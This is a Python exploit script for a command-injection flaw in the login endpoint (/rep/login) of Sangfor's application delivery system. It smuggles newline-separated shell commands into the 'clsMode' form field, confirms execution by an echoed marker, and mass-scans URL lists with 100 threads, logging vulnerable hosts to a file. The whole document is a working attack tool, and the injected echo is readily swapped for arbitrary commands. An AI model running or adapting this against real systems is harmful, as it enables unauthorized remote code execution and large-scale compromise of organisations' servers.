# 深信服应用交付系统命令执行漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
███████╗██╗  ██╗███████╗    ██████╗  ██████╗███████╗
██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
███████╗ ╚███╔╝ █████╗█████╗██████╔╝██║     █████╗  
╚════██║ ██╔██╗ ██╔══╝╚════╝██╔══██╗██║     ██╔══╝  
███████║██╔╝ ██╗██║         ██║  ██║╚██████╗███████╗
╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                    author:daesen804
                                    version:1.0.0             
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服应用交付系统命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/rep/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Length': '132'
    }
    data = "clsMode=cls_mode_login%0Aecho%20test123%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    
    try:
        res = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'test123' in res.text:
            with open("result.txt",'a') as fp:
                fp.write(target+'\n')
            print(f"[+]{target} 存在RCE漏洞")
        else:
            print(f"[-]{target} 不存在RCE漏洞")
    except:
        pass
        

if __name__ == '__main__':
    main()